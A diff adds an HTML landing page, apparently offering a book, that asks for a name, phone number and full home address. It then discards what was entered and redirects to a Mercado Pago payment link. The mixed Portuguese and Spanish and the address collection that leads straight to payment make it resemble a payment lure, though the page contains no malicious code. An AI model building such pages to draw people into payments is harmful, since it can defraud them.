@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Receba seu Libro</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 135vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 10px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: left;
+        }
+        label {
+            font-size: 14px;
+            font-weight: bold;
+            display: block;
+            margin-top: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 105%;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #218838;
+        }
+    </style>
+    <script>
+        function redirecionar(event) {
+            event.preventDefault();
+            window.location.href = 'https://mpago.la/2zPFakk';
+        }
+    </script>
+</head>
+<body>
+    <nav class="navbar" style="padding-top: 120px;">
+        <div class="menu-icon" style="padding-left: -5%;">
+            <img fetchpriority="high" decoding="async" width="440" height="94" src="images/7tYoRmTkKwTC.webp" alt="np">
+        </div>
+    </nav>
+  
+    <div class="container">
+        <form action="#" method="POST" onsubmit="redirecionar(event)">
+            <label for="nombre">Nombre</label>
+            <input type="text" id="nombre" name="nombre" required>
+            
+            <label for="telefono">Teléfono</label>
+            <input type="tel" id="telefono" name="telefono" required>
+            
+            <label for="estado">Estado</label>
+            <input type="text" id="estado" name="estado" required>
+            
+            <label for="ciudad">Ciudad</label>
+            <input type="text" id="ciudad" name="ciudad" required>
+            
+            <label for="vecindario">Vecindario</label>
+            <input type="text" id="vecindario" name="vecindario" required>
+            
+            <label for="camino">Camino</label>
+            <input type="text" id="camino" name="camino" required>
+            
+            <label for="numero">Número de casa</label>
+            <input type="text" id="numero" name="numero" required>
+            
+            <label for="punto_de_referencia">Punto de referencia</label>
+            <input type="text" id="punto_de_referencia" name="punto_de_referencia">
+            
+            <button type="submit">Continuar</button>
+        </form>
+    </div>
+</body>
+</html>
+
+<img src="images/imagens.jpg" width="390" height="250">
